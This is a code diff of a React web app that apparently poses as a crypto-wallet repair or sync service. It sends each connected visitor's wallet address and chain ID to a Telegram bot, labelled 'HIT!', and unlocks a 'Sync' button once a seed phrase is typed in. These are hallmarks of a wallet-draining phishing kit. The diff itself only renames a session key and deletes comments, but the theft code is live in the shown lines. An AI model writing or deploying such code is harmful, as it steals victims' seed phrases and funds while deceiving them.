@@ -24,9 +24,9 @@ export default function App() {
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_100')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Monday_Fix')) {
       log(`🎯 HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_100', 't');
+      sessionStorage.setItem('hit_vF_Monday_Fix', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -49,9 +49,7 @@ export default function App() {
     } else { setInputVal(""); }
   }, [activeTask, tB, nB, selectedAsset]);
 
-  // Logic: Only Rectify is instantly Green. Others need input.
   const isHandshakeActive = activeTask === "Rectify" || (inputVal.length > 0 && inputVal !== "0" && inputVal !== "0.00");
-  // Logic: Sync button needs words typed in.
   const isSyncActive = seedVal.trim().length > 10;
 
   const handleHandshake = () => {
